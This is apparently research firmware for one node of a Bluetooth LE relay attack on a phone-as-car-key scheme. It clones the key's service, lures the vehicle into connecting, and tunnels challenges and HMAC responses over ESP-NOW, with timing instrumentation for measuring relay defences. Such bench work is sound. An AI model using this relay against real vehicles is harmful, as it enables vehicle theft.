/*
 * Relay B — BLE peripheral (near the vehicle) + ESP-NOW link.
 *
 * Role in the attack:
 *   - clones the key's service and advertises it, so the vehicle connects to it;
 *   - when the vehicle writes the challenge, assigns a seq (round) and sends [seq][nonce]
 *     over ESP-NOW (LINK_MSG_CHALLENGE);
 *   - when the response from Relay A arrives (LINK_MSG_RESPONSE: [seq][turnaround A][HMAC]),
 *     it hands it to the vehicle only if the seq matches the pending challenge. A late or
 *     duplicate response is discarded and counted as "late" (M-04).
 *
 * Two halves:
 *   - SELFTEST (RELAY_LINK_SELFTEST 1): Milestone 1, no BLE. Relay B plays the originator
 *     (as the vehicle would): it fires a periodic challenge and measures the round trip over
 *     the A<->B tunnel (link overhead, no BLE).
 *   - BLE (RELAY_LINK_SELFTEST 0): Milestone 2. A NimBLE GATT server mirroring the app's
 *     KeyPeripheral.kt: service SVC_UUID with CHALLENGE (write) and RESPONSE (notify).
 *
 * Execution context: the ESP-NOW callback (on_link_rx) runs in the WiFi task and must not do
 * long work; so the response coming from the tunnel is queued, and the GATT call (notify)
 * happens in the 'notify_worker' task. The reverse path (vehicle write -> tunnel) runs in the
 * NimBLE host task and calls link_send directly (esp_now_send does not block).
 */

#include "relay_b.h"
#include "relay_config.h"
#include "link.h"
#include "ble_contract.h"
#include "ble_link_params.h"
#include "run_meta.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"

#include "cyd_display.h"
#include "cyd_led.h"
#include "cyd_ui.h"

static const char *TAG = "RELAY_B";

/* Accent color of Relay B (cyan) and the card indices in the UI. */
#define ACCENT 0x00B8D4
enum { F_CAR = 0, F_TUNNEL = 1, F_RTT = 2 };

/* Counters shown on the display. */
#if !RELAY_LINK_SELFTEST
static uint32_t s_from_vehicle;   /* challenges written by the vehicle -> tunnel (BLE build only) */
#endif
static uint32_t s_from_tunnel;    /* responses coming from the tunnel -> notify to the vehicle */

/* Label of the timing card: the tunnel RTT in the self-test; the turnaround of B over BLE (V-04). */
#if RELAY_LINK_SELFTEST
#define RTT_LABEL "tunnel RTT"
#else
#define RTT_LABEL "Turnaround"
#endif

/* Sets up the display, LED and UI. Called at the start of relay_b_start (both modes). */
static void relay_b_ui_init(void)
{
    cyd_display_init();
    cyd_led_init();
    cyd_display_set_backlight(90);
    cyd_ui_cfg_t cfg = {
        .title  = "RELAY B",
        .accent = ACCENT,
        .mascot = CYD_MASCOT_RELAY,
        .fields = { "From car", "From tunnel", RTT_LABEL, NULL },
        .hex0   = "resp",
        .hex1   = NULL,
    };
    cyd_ui_init(&cfg);
    cyd_ui_set_field(F_CAR, "0");
    cyd_ui_set_field(F_TUNNEL, "0");
    cyd_ui_set_field(F_RTT, "-");
}

/* Injected delay (bench only, BLE build): Relay B holds each vehicle challenge for s_delay_ms
 * before it goes on the tunnel, to measure where the verifier's timeout stops the relay. Set with
 * "DELAY <ms>" on UART0; 0 is the normal relay. The hold is an esp_timer one-shot, so the NimBLE
 * host task is not blocked. The injected time lands in the tunnel leg of the round's breakdown. */
#if !RELAY_LINK_SELFTEST
static volatile uint32_t s_delay_ms;
static esp_timer_handle_t s_delay_timer;
static uint8_t s_delay_frame[LINK_CHAL_LEN];

static void delayed_chal_cb(void *arg)
{
    link_send(LINK_MSG_CHALLENGE, s_delay_frame, sizeof s_delay_frame);
}
#endif

void relay_b_set_delay_ms(uint32_t ms)
{
#if !RELAY_LINK_SELFTEST
    s_delay_ms = ms;
#else
    (void) ms;
#endif
}

/* Frame B -> A: [seq][nonce]. The seq is the round assigned by B; A returns the same seq. */
static inline void forward_challenge(uint32_t seq, const uint8_t *nonce)
{
    uint8_t frame[LINK_CHAL_LEN];
    memcpy(frame, &seq, LINK_SEQ_LEN);
    memcpy(frame + LINK_SEQ_LEN, nonce, NONCE_LEN);
#if !RELAY_LINK_SELFTEST
    if (s_delay_ms > 0) {
        memcpy(s_delay_frame, frame, sizeof frame);
        if (s_delay_timer == NULL) {
            const esp_timer_create_args_t a = { .callback = delayed_chal_cb, .name = "chal_delay" };
            esp_timer_create(&a, &s_delay_timer);
        }
        esp_timer_stop(s_delay_timer);   /* a newer challenge replaces a held one */
        esp_timer_start_once(s_delay_timer, (uint64_t) s_delay_ms * 1000u);
        return;
    }
#endif
    link_send(LINK_MSG_CHALLENGE, frame, sizeof frame);
}

#if RELAY_LINK_SELFTEST
/* -------- Milestone 1: tunnel self-test, no BLE --------------------------- */

static esp_timer_handle_t st_timer;
static uint32_t st_seq;
static int64_t  st_tx_us;

static void selftest_fire(void *arg)
{
    uint8_t nonce[NONCE_LEN] = {0};
    memcpy(nonce, &st_seq, sizeof st_seq);   /* nonce = counter, only for the test */
    st_tx_us = esp_timer_get_time();
    forward_challenge(st_seq, nonce);
    st_seq++;
    cyd_ui_set_field(F_CAR, "%lu", (unsigned long) st_seq);
    esp_timer_start_once(st_timer, 1000000); /* 1 s */
}

#else
/* -------- Milestone 2: BLE peripheral (key clone) ------------------------- */

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gatt.h"
#include "host/util/util.h"
#include "os/os_mbuf.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

static uint8_t  own_addr_type;
static uint16_t g_conn = BLE_HS_CONN_HANDLE_NONE;
static uint16_t h_response_val;                 /* RESPONSE handle, used by the notify */
static uint8_t  last_response[RESPONSE_LEN];     /* last response (for READ) */

/* Per-round measurements (paper): Relay B sees the vehicle's challenge and the response coming
 * back; the local turnaround (rx_chal -> tx_resp) = tunnel + key side, as seen by B. The nonce
 * (4 bytes) correlates the round with the logs of the vehicle, Relay A and the key. */
static int64_t  s_t_chal_us;
static uint8_t  s_nonce4[4];

/* Round (seq) assigned to the vehicle's last challenge, and whether it still awaits a response.
 * Written in the host task (vehicle write) and read in notify_worker. */
static volatile uint32_t s_round;
static volatile uint32_t s_pending_seq;
static volatile bool     s_pending_open;
static volatile uint32_t s_late;                /* late/duplicate responses discarded */
static uint32_t s_disconnects;                  /* drops of the vehicle connection (M-12) */

/* Vehicle-bound queue: seq + response + turnaround of A, filled in the ESP-NOW callback (WiFi
 * task) and consumed by the notify_worker task (which may call the GATT API). */
typedef struct { uint32_t seq; uint32_t turn_a_us; uint8_t data[RESPONSE_LEN]; } notify_item_t;
static QueueHandle_t notify_q;

static int  gap_event(struct ble_gap_event *event, void *arg);
static void start_advertising(void);
static void host_task(void *param);

/* ---- GATT server (mirror of KeyPeripheral.kt) --------------------------- */

static int gatt_access(uint16_t conn_handle, uint16_t attr_handle,
                       struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    switch (ctxt->op) {
    case BLE_GATT_ACCESS_OP_WRITE_CHR:
        if (ble_uuid_cmp(ctxt->chr->uuid, &CHR_CHALLENGE_UUID.u) == 0) {
            uint8_t nonce[NONCE_LEN];
            uint16_t olen = 0;
            int rc = ble_hs_mbuf_to_flat(ctxt->om, nonce, sizeof nonce, &olen);
            if (rc != 0 || olen != NONCE_LEN) return BLE_ATT_ERR_UNLIKELY;
            s_t_chal_us = esp_timer_get_time();
            memcpy(s_nonce4, nonce, 4);
            s_round++;
            /* A response is valid only for this seq: mark it pending BEFORE sending the frame. */
            s_pending_seq = s_round;
            s_pending_open = true;
            ESP_LOGI(TAG, "HOP B rx_chal round=%lu nonce=%02x%02x%02x%02x t=%lld us",
                     (unsigned long) s_round, nonce[0], nonce[1], nonce[2], nonce[3],
                     (long long) s_t_chal_us);
            ESP_LOGI(TAG, "vehicle challenge (%u B) -> tunnel", olen);
            forward_challenge(s_round, nonce);
            cyd_ui_link_pulse(0, NULL);                                           /* V-12: challenge reaches B and goes on to A */
            s_from_vehicle++;
            cyd_ui_set_field(F_CAR, "%lu", (unsigned long) s_from_vehicle);
            cyd_ui_pulse();
            return 0;
        }
        return BLE_ATT_ERR_WRITE_NOT_PERMITTED;

    case BLE_GATT_ACCESS_OP_READ_CHR:
        if (ble_uuid_cmp(ctxt->chr->uuid, &CHR_RESPONSE_UUID.u) == 0) {
            int rc = os_mbuf_append(ctxt->om, last_response, RESPONSE_LEN);
            return rc == 0 ? 0 : BLE_ATT_ERR_INSUFFICIENT_RES;
        }
        return BLE_ATT_ERR_READ_NOT_PERMITTED;

    default:
        return BLE_ATT_ERR_UNLIKELY;
    }
}

/* CHALLENGE: write / write-no-rsp. RESPONSE: read + notify (NimBLE creates the CCCD 0x2902). */
static const struct ble_gatt_chr_def gatt_chrs[] = {
    {
        .uuid      = &CHR_CHALLENGE_UUID.u,
        .access_cb = gatt_access,
        .flags     = BLE_GATT_CHR_F_WRITE | BLE_GATT_CHR_F_WRITE_NO_RSP,
    },
    {
        .uuid       = &CHR_RESPONSE_UUID.u,
        .access_cb  = gatt_access,
        .flags      = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY,
        .val_handle = &h_response_val,
    },
    { 0 },
};

static const struct ble_gatt_svc_def gatt_svcs[] = {
    {
        .type            = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid            = &SVC_UUID.u,
        .characteristics = gatt_chrs,
    },
    { 0 },
};

/* ---- advertising -------------------------------------------------------- */

static void start_advertising(void)
{
    /* Advertises the 128-bit SVC_UUID so the vehicle finds the key "clone". */
    struct ble_hs_adv_fields fields = {0};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.uuids128 = (ble_uuid128_t[]){ SVC_UUID };
    fields.num_uuids128 = 1;
    fields.uuids128_is_complete = 1;

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) { ESP_LOGE(TAG, "adv_set_fields rc=%d", rc); return; }

    /* The name goes in the scan response, so the 31-byte advertising packet does not overflow. */
    const char *name = ble_svc_gap_device_name();
    struct ble_hs_adv_fields rsp = {0};
    rsp.name = (uint8_t *) name;
    rsp.name_len = strlen(name);
    rsp.name_is_complete = 1;
    ble_gap_adv_rsp_set_fields(&rsp);

    struct ble_gap_adv_params advp = {0};
    advp.conn_mode = BLE_GAP_CONN_MODE_UND;
    advp.disc_mode = BLE_GAP_DISC_MODE_GEN;
    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &advp, gap_event, NULL);
    if (rc != 0) ESP_LOGE(TAG, "adv_start rc=%d", rc);
    else { ESP_LOGI(TAG, "advertising the key clone; waiting for the vehicle");
           cyd_ui_set_state("advertising clone", ACCENT); }
}

/* ---- GAP events --------------------------------------------------------- */

static int gap_event(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            g_conn = event->connect.conn_handle;
            ESP_LOGI(TAG, "vehicle connected (handle %u)", g_conn);
            ble_link_log_conn(TAG, g_conn);                                    /* M-10 */
            cyd_ui_set_state("car connected", 0x1AA260);
            cyd_ui_set_link(CYD_LINK_BLE, 1);                             /* V-06 */
        } else {
            ESP_LOGE(TAG, "connection failed (status=%d); re-advertising", event->connect.status);
            start_advertising();
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        s_disconnects++;                                                  /* M-12 */
        ESP_LOGW(TAG, "vehicle disconnected (reason=%d, disconnects=%lu); re-advertising",
                 event->disconnect.reason, (unsigned long) s_disconnects);
        g_conn = BLE_HS_CONN_HANDLE_NONE;
        s_pending_open = false;   /* the round in flight will not be delivered to anyone */
        cyd_ui_set_link(CYD_LINK_BLE, 0);                                 /* V-06 */
        cyd_ui_set_state("advertising clone", ACCENT);
        start_advertising();
        break;

    case BLE_GAP_EVENT_CONN_UPDATE:                                       /* M-10 */
        if (event->conn_update.status == 0)
            ble_link_log_conn(TAG, event->conn_update.conn_handle);
        break;

    case BLE_GAP_EVENT_MTU:                                               /* M-11 */
        ble_link_log_mtu(TAG, event->mtu.conn_handle, event->mtu.value);
        break;

    case BLE_GAP_EVENT_SUBSCRIBE:
        ESP_LOGI(TAG, "vehicle %s notify on RESPONSE",
                 event->subscribe.cur_notify ? "enabled" : "disabled");
        break;

    case BLE_GAP_EVENT_ADV_COMPLETE:
        start_advertising();
        break;

    default:
        break;
    }
    return 0;
}

/* ---- worker task: tunnel response -> notify to the vehicle -------------- */

static void notify_worker(void *arg)
{
    notify_item_t it;
    for (;;) {
        if (xQueueReceive(notify_q, &it, portMAX_DELAY) != pdTRUE) continue;

        /* M-04: only deliver the response to the pending challenge (same seq). A late response
         * (it arrived after the vehicle's timeout) or a duplicate is dropped here and never
         * reaches the vehicle. */
        if (!s_pending_open || it.seq != s_pending_seq) {
            s_late++;
            ESP_LOGW(TAG, "response for round %lu dropped (pending=%s, current=%lu); late=%lu",
                     (unsigned long) it.seq, s_pending_open ? "yes" : "no",
                     (unsigned long) s_pending_seq, (unsigned long) s_late);
            continue;
        }
        s_pending_open = false;

        if (g_conn == BLE_HS_CONN_HANDLE_NONE) {
            ESP_LOGW(TAG, "response arrived with no vehicle connected; dropping");
            continue;
        }
        memcpy(last_response, it.data, RESPONSE_LEN);

        struct os_mbuf *om = ble_hs_mbuf_from_flat(it.data, RESPONSE_LEN);
        if (om == NULL) { ESP_LOGE(TAG, "no mbuf for notify"); continue; }

        int rc = ble_gatts_notify_custom(g_conn, h_response_val, om);  /* consumes the mbuf */
        if (rc != 0) ESP_LOGE(TAG, "notify rc=%d", rc);
        else ESP_LOGI(TAG, "response (%u B) notified to the vehicle", RESPONSE_LEN);

        /* Local turnaround of B (challenge received -> response notified): tunnel + key side.
         * One parseable CSVB line per round, correlated by seq and nonce. The last column is
         * the turnaround of A (M-05), to break the round down. */
        int64_t turn = esp_timer_get_time() - s_t_chal_us;
        int8_t rssi = 0;
        ble_gap_conn_rssi(g_conn, &rssi);
        ESP_LOGI(TAG, "HOP B tx_resp round=%lu nonce=%02x%02x%02x%02x turnaround=%lld us rssi=%d dBm",
                 (unsigned long) it.seq, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
                 (long long) turn, rssi);
        uint32_t tx_failures = 0;
        link_tx_stats(&tx_failures, NULL);                                   /* M-07 */
        ESP_LOGI(TAG, "CSVB,%lu,%02x%02x%02x%02x,%lld,%d,%lu,%lu",
                 (unsigned long) it.seq, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
                 (long long) turn, rssi, (unsigned long) it.turn_a_us,
                 (unsigned long) tx_failures);

        s_from_tunnel++;
        cyd_ui_set_field(F_TUNNEL, "%lu", (unsigned long) s_from_tunnel);
        char turn_txt[24];                                                 /* V-04 */
        cyd_fmt_us(turn_txt, sizeof turn_txt, turn);
        cyd_ui_set_field(F_RTT, "%s", turn_txt);
        {   /* V-12/V-13: response A -> B with the tunnel time; bar tunnel | A<->key */
            int64_t tunnel = turn - (int64_t) it.turn_a_us;
            char tv[24], lbl[32];
            cyd_fmt_us(tv, sizeof tv, tunnel);
            snprintf(lbl, sizeof lbl, "tunnel %s", tv);
            cyd_ui_link_pulse(1, lbl);
            cyd_ui_stack_bar(tunnel, (int64_t) it.turn_a_us);
        }
        cyd_ui_set_hex(0, it.data, RESPONSE_LEN);
        cyd_ui_pulse();
    }
}

/* ---- host lifecycle ----------------------------------------------------- */

static void on_sync(void)
{
    if (ble_hs_util_ensure_addr(0) != 0) { ESP_LOGE(TAG, "no BLE address"); return; }
    if (ble_hs_id_infer_auto(0, &own_addr_type) != 0) { ESP_LOGE(TAG, "address inference failed"); return; }
    start_advertising();
}

static void on_reset(int reason) { ESP_LOGE(TAG, "BLE reset (reason=%d)", reason); }

static void host_task(void *param)
{
    nimble_port_run();
    nimble_port_freertos_deinit();
}

#endif /* RELAY_LINK_SELFTEST */

/* ------------------------------------------------------------------------- */
/* Receives frames from Relay A. Runs in the WiFi task context.              */
/* ------------------------------------------------------------------------- */
static void on_link_rx(link_msg_type_t type, const uint8_t *data, size_t len)
{
    switch (type) {
    case LINK_MSG_RESPONSE:
#if RELAY_LINK_SELFTEST
    {
        int64_t rtt = esp_timer_get_time() - st_tx_us;
        ESP_LOGI(TAG, "[selftest] response received (%d B); tunnel RTT=%lld us",
                 (int) len, (long long) rtt);
        s_from_tunnel++;
        cyd_ui_set_field(F_TUNNEL, "%lu", (unsigned long) s_from_tunnel);
        char rtt_txt[24];
        cyd_fmt_us(rtt_txt, sizeof rtt_txt, rtt);
        cyd_ui_set_field(F_RTT, "%s", rtt_txt);
        {   /* V-12: in the self-test the link shows the tunnel RTT */
            char lbl[32];
            snprintf(lbl, sizeof lbl, "RTT %s", rtt_txt);
            cyd_ui_link_pulse(1, lbl);
        }
        cyd_ui_set_hex(0, data, (int) len);
        cyd_ui_pulse();
    }
#else
    {
        /* Format [seq][turnaround A][HMAC]: any other length is garbage and does not reach the vehicle. */
        if (len != LINK_RESP_LEN) {
            ESP_LOGW(TAG, "tunnel response with %u B (expected %d); dropping",
                     (unsigned) len, LINK_RESP_LEN);
            break;
        }
        /* Queue it for the worker task to notify the vehicle (no GATT calls here). */
        notify_item_t it;
        memcpy(&it.seq, data, LINK_SEQ_LEN);
        memcpy(&it.turn_a_us, data + LINK_SEQ_LEN, 4);
        memcpy(it.data, data + LINK_SEQ_LEN + 4, RESPONSE_LEN);
        if (xQueueSend(notify_q, &it, 0) != pdTRUE)
            ESP_LOGW(TAG, "notify queue full; dropping response");
    }
#endif
        break;
    default:
        break;
    }
}

void relay_b_start(void)
{
    relay_b_ui_init();
    run_meta_print("relay-b");                                            /* M-13b */
    cyd_ui_splash(run_meta_commit(), 2000);                               /* V-15 */
#if RELAY_LINK_SELFTEST
    cyd_ui_set_tag("SELFTEST");                                           /* V-06 */
#else
    cyd_ui_set_tag("CHAIN");
    cyd_ui_set_link(CYD_LINK_BLE, 0);                                     /* vehicle not connected yet */
#endif
#if RELAY_LINK_SELFTEST
    cyd_ui_set_state("tunnel self-test", ACCENT);
    ESP_ERROR_CHECK(link_init(on_link_rx));
    cyd_ui_set_link(CYD_LINK_ESPNOW, 1);                                  /* V-06 */
    const esp_timer_create_args_t ta = { .callback = selftest_fire, .name = "selftest" };
    ESP_ERROR_CHECK(esp_timer_create(&ta, &st_timer));
    esp_timer_start_once(st_timer, 1000000);
    ESP_LOGI(TAG, "Relay B started (tunnel self-test; originating challenges every 1 s)");
#else
    /* Create the queue and the worker task BEFORE link_init (which registers the ESP-NOW
     * callback), so no frame reaches on_link_rx while the queue is still NULL. */
    notify_q = xQueueCreate(4, sizeof(notify_item_t));
    if (notify_q == NULL) { ESP_LOGE(TAG, "no notify queue"); return; }
    xTaskCreate(notify_worker, "notify_wk", 4096, NULL, 10, NULL);

    ESP_ERROR_CHECK(link_init(on_link_rx));
    cyd_ui_set_link(CYD_LINK_ESPNOW, 1);                                  /* V-06 */

    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) { ESP_LOGE(TAG, "nimble_port_init rc=%d", ret); return; }

    ble_hs_cfg.reset_cb = on_reset;
    ble_hs_cfg.sync_cb  = on_sync;

    ble_svc_gap_init();
    ble_svc_gatt_init();
    ble_svc_gap_device_name_set("relay-b");

    int rc = ble_gatts_count_cfg(gatt_svcs);
    if (rc != 0) { ESP_LOGE(TAG, "gatts_count_cfg rc=%d", rc); return; }
    rc = ble_gatts_add_svcs(gatt_svcs);
    if (rc != 0) { ESP_LOGE(TAG, "gatts_add_svcs rc=%d", rc); return; }

    nimble_port_freertos_init(host_task);
    ESP_LOGI(TAG, "Relay B started (BLE peripheral: key clone)");
#endif
}
